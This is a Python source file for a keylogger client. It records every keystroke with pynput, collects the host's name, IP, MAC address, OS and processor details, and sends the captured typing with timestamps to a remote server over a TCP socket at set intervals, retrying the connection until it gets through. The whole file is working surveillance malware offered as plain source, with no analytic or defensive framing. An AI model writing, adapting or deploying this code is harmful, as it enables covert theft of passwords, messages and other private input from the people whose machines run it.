import sys
import socket
import threading
import pynput.keyboard
import platform,re,uuid
from time import gmtime, strftime


class KeyloggerClient:

    def __init__(self, port, ip, time_interval, fileName):
        self.log = ""
        self.port = port
        self.host_ip = ip
        self.fileName = fileName
        self.interval = time_interval
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


        # create log file
        try:
            with open(self.fileName, 'a') as file:
                file.close()
        except OSError:
            print("[+]unable to create file")


    # append logged characters to log variable
    def append_string(self, string):
        self.log = self.log + string


    # log keystrokes
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_string(current_key)


    # print contents in log file
    def getLogData(self):
        with open(self.fileName, "r") as logFile:
            lines = logFile.readlines()
            for line in lines:
                print(line + "\n")
        timer = threading.Timer(5, self.getLogData)
        timer.start()


    # write logged data to text file
    def writeToTxt(self):
        self.sock.send(str(strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ": " + self.log + "\n").encode())
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.writeToTxt)
        timer.start()


    # start the keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.writeToTxt()
            self.getLogData()
            keyboard_listener.join()


    # get system information to be sent back to the server
    def getSystemInfo(self):
        info = [socket.gethostname(), socket.gethostbyname(socket.gethostname()),
                ':'.join(re.findall('..', '%012x' % uuid.getnode())), platform.system(),
                platform.release(), platform.processor().replace(',', '')]

        return ",".join(info)


    # establish connection with the server
    def establishConnection(self):
        while True:
            try:
                self.sock.connect((self.host_ip, self.port))
                break
            except:
                print("[-]Unable to connect")
        self.sock.send(self.getSystemInfo().encode())

        while True:
            self.start()




